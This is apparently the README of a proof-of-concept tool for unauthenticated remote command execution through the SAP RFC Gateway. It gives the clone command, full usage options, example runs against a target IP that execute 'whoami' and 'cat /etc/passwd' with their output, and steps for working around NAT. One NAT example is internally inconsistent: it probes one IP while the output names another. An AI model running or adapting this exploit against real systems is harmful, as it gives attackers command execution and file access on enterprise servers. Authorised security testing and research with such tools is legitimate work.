# SAP RFC Gateway RCE

This POC is based on the original research from @chipik and @gelim which can be found in their [Github repository](https://github.com/chipik/SAP_GW_RCE_exploit).

The script leverages an intended functionality of the SAP RFC Gateway to achieve unauthenticated Remote Command Execution on the SAP server.

> [!WARNING]
> Make sure you have the appropriate permissions to actively scan and test applications. Without doing so, you might face legal implications.

**No external dependencies required** — SAP LZH/LZC decompression is built-in (pure Python). Output from long-running commands is automatically decompressed.

## Tested Systems

- SAP S/4 HANA 2025 FSP01 (S4H - SAP CAL Edition) (Linux)
- SAP S/4 HANA 2023 (A4H - SAP Developer Edition) (Linux)
- SAP S/4 HANA 2022 (A4H - SAP Developer Edition) (Linux)
- SAP NetWeaver 7.52 (NPL - SAP Developer Edition) (Linux)
- Solution Manager 7.52 (Windows)

## Installation

```bash
git clone https://github.com/randomstr1ng/SAP-RFC-Gateway-RCE.git
```

No additional packages needed — the script runs with the Python 3 standard library only.

## Usage

```
python3 SAPanonGWv3.py -h
usage: SAPanonGWv3.py [-h] -t IP [-p PORT] [-c CMD] [--protocol {modern,legacy}]
                       [-s SID] [--appserver HOSTNAME] [--server-ip IP] [--check]
                       [-v] [-d]

SAP RFC Gateway Remote Command Execution (v3)

options:
  -h, --help            show this help message and exit
  -t IP, --ip IP        Target SAP system IP
  -p PORT, --port PORT  Gateway port (default: 3300)
  -c CMD, --cmd CMD     Command to execute (default: whoami)
  --protocol {modern,legacy}
                        Target SAP kernel protocol (default: modern)
                          modern  - S/4HANA systems (kernel 758/793+)
                          legacy  - Classic NW7.52 / R/3 systems
  -s SID, --sid SID     SAP System ID of the target (3 chars).
                        Default: A4H (modern) or NPL (legacy)
  --appserver HOSTNAME  Application server hostname for TH routing.
                        Default: vhcala4hci (modern) or npl-sxpg (legacy).
                        Must match the app server registered on the target gateway.
  --server-ip IP        Override the SAP server IP embedded in packets.
                        Use when the target is behind NAT (see --check below).
  --check               Probe the target with RFC_SYSTEM_INFO to discover its
                        internally-configured IP address. Useful to detect NAT
                        before running the exploit.
  -v, --verbose         Show connection steps and session details
  -d, --debug           Show hex dumps of all packets
```

## Basic Example

```bash
$ python3 SAPanonGWv3.py -t 10.20.30.15 -p 3300 -c whoami
a4hadm

$ python3 SAPanonGWv3.py -t 10.20.30.15 -p 3300 -c 'cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
...

$ python3 SAPanonGWv3.py -t 10.20.30.15 -p 3300 -c '/usr/sap/S4H/exe/dpmon'
...
```

## NAT / Private IP Scenarios

SAP Gateway embeds the server's own IP address in RFC routing headers. If the
target sits behind a NAT gateway, the IP the server knows about (`10.x.x.x`)
differs from the public IP you connect to. This causes the exploit to fail with a
routing error.

**Step 1 — Detect the internal IP:**

```bash
$ python3 SAPanonGWv3.py --check -t 20.31.218.163 -p 3300
[+] Server RFCIPADDR: 10.0.0.78
[!] Differs from -t '1.11.111.2' (NAT detected)
[!] Use: --server-ip 10.0.0.78
```

**Step 2 — Run the exploit with the internal IP:**

```bash
$ python3 SAPanonGWv3.py -t 1.11.111.2 -p 3300 --server-ip 10.0.0.78 -c whoami
s4hadm
```

## Command Limits

| Parameter | Max length |
|-----------|-----------|
| Program / path | 255 bytes |
| Arguments | 255 bytes |

Commands shorter than 7 characters with no arguments use a compact packet
template. All longer commands or those with arguments use dynamic packet
building with full RFC counter patching — paths like
`/usr/sap/S4H/exe/dpmon` and shell wrappers like `/bin/sh -c "id; uname -a"`
work out of the box.
